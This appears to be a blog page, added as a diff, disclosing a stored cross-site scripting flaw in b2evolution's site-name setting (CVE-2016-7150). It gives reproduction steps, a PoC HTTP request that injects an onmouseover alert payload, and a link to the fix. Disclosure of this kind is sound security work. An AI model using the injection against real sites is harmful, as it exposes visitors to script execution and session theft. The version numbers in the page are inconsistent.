@@ -1,1 +1,190 @@
+<!DOCTYPE html>
+<html lang="en-us">
 
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      B2evolution v6.4.7 website title XSS [CVE-2016-7150] &middot; 储藏间
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/blog/public/css/poole.css">
+  <link rel="stylesheet" href="/blog/public/css/syntax.css">
+  <link rel="stylesheet" href="/blog/public/css/hyde.css">
+  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/blog/public/apple-touch-icon-144-precomposed.png">
+                                 <link rel="shortcut icon" href="/blog/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/blog/atom.xml">
+</head>
+
+
+  <body>
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      <h1>
+        <a href="/blog/">
+          储藏间
+        </a>
+      </h1>
+      <p class="lead">是个用来放洞的储藏间</p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/blog/">Home</a>
+
+      
+
+      
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/blog//about/">About</a>
+          
+        
+      
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+
+      <!--
+      <a class="sidebar-nav-item" href="/archive/v2.1.0.zip">Download</a>
+      <a class="sidebar-nav-item" href="">GitHub project</a>
+      !-->
+      <span class="sidebar-nav-item">Currently v2.1.0</span>
+    </nav>
+
+    <p>&copy; 2018. All rights reserved.</p>
+  </div>
+</div>
+
+
+    <div class="content container">
+      <div class="post">
+  <h1 class="post-title">B2evolution v6.4.7 website title XSS [CVE-2016-7150]</h1>
+  <span class="post-date">06 Feb 2017</span>
+  <p>发现者: 陈瑞琦</p>
+
+<p>发现日期: 2016-08-11</p>
+
+<p>下载地址: <a href="http://b2evolution.net/downloads/">b2evolution</a></p>
+
+<p>作者: b2evolution.net</p>
+
+<p>作者通知日期: 2016-08-11</p>
+
+<p>作者联系手段: http://b2evolution.net/?disp=msgform</p>
+
+<p>CVE-ID：CVE-2016-7150</p>
+
+<p><strong>描述:</strong></p>
+
+<p>b2evolutioe is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
+b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a “one click install” web app.<a href="Wiki">3</a></p>
+
+<p><strong>细节:</strong></p>
+
+<p>There is stored XSS in b2evolution version 6.7.4</p>
+
+<p>An authentic user can inject javascript code in the website header.</p>
+
+<p>A moderator can change the “Short site name” or the “Longe site name” at back-office site-settings page with something like {test_short_name_xss” onmouseover=alert(1) on}.</p>
+
+<p>Step 1 : Login the back-office as a moderator</p>
+
+<p>Step 2 : Edit the “Short site name” at http://192.168.204.128/b2evolution/
+admin.php?ctrl=collections&amp;tab=site_settings with something like {test_short_name_xss” onmouseover=alert(1) on}</p>
+
+<p>Step 3 : Save the changes</p>
+
+<p>Step 4 : Anyone view the site, when the mouse over the content(the header of the site), the XSS code runs.</p>
+
+<p><strong>PoC:</strong></p>
+
+<p><code class="highlighter-rouge">code</code></p>
+<pre><code>
+POST /b2evolution/admin.php HTTP/1.1
+Host: 192.168.204.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.204.128/b2evolution/admin.php?ctrl=collections&amp;tab=site_settings
+Cookie: session_b2evo_192_168_204_128=50_BTD1n98LyyQAYUsyXDD4Kv9IPvGwEVO0; __smToken=AhuNTZNC8BaMfAVQV7ZpTW5a; evo_style=Variation
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 646
+
+site_code=b2evo&amp;site_color=%23ff8c0f&amp;notification_short_name=test_short_name_xss%22onmouseover%3D%22alert%281%29%22on%3D%221&amp;notification_long_name=_name&amp;notification_logo=http%3A%2F%2Ftesttest1.test&amp;site_footer_text=C%22ookies+are+required+to+enable+core+site+functionality.+%26copy%3B%24year%24+by+%24short_site_name%24.&amp;site_skins_enabled=1&amp;site_terms=12&amp;default_blog_ID=1&amp;info_blog_ID=1&amp;login_blog_ID=1&amp;msg_blog_ID=1&amp;reloadpage_timeout_value=5&amp;reloadpage_timeout_name=minute&amp;general_cache_enabled=1&amp;submit=Save+Changes%21&amp;crumb_collectionsettings=cxoiVqilvis2bz9Se6WJsIc2DTgvhQFX&amp;ctrl=collections&amp;tab=site_settings&amp;action=update_settings_site
+
+</code></pre>
+
+<p><strong>Fix:</strong></p>
+
+<p>https://github.com/b2evolution/b2evolution/commit/dd975fff7fce81bf12f9c59edb1a99475747c83c</p>
+
+</div>
+
+<div class="related">
+  <h2>Related Posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/blog//2016/12/29/b2evolution-xss-3/">
+            B2evolution v6.4.7 website title XSS [CVE-2016-7150]
+            <small>29 Dec 2016</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/blog//2016/12/29/b2evolution-xss-2/">
+            B2evolution v6.4.7 forum XSS [CVE-2016-7149]
+            <small>29 Dec 2016</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/blog//2016/12/28/b2evolution-xss/">
+            B2evolution v6.4.7 XSS [CVE-2016-6821]
+            <small>28 Dec 2016</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+    </div>
+
+  </body>
+</html>
